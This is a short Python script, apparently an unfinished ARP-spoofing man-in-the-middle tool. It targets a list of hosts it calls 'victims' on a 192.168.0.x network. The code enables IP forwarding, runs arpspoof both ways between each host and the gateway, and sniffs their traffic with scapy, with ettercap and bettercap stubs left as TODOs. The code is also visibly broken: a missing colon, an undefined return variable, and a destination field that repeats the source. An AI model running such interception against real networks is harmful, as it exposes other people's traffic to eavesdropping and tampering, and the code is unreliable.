from subprocess import Popen, PIPE
from scapy.all import sniff
import os

def run_command(cmd):
	process = Popen([cmd], stdout=PIPE, shell=True)
	stdout, stderr = process.communicate()
	return out
 
victims = []
[[ victims.append('192.168.0.{}'.format(i)) for i in range(2, 11) ]]

# Custom function to be apllied to each sniffed packet
def wait_all_victims(packet):
	src_addr = packet[0][1].src
	dst_addr = packet[0][1].src
	if src_addr in victims:
		victims.remove(src_addr)
	if len(victims) == 0:
		exit()
	print("Source: {}, Dest: {}".format(src_addr, dst_addr))

def ettercap():
	# TODO
	pass

def bettercap():
	# TODO
	pass

def mitmf():
	# TODO
	pass

def dsniff()
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	for i in range(2, 11):
		os.system("arpspoof -t 192.168.0.1 192.168.0.{} &".format(i))
		os.system("arpspoof -t 192.168.0.{} 192.168.0.1 &".format(i))

def main():
	dsniff()
	try:
		sniff(filter="ip", prn=wait_all_victims)
	except PermissionError:
		print("Need to run as root")

if __name__ == '__main__':
	main()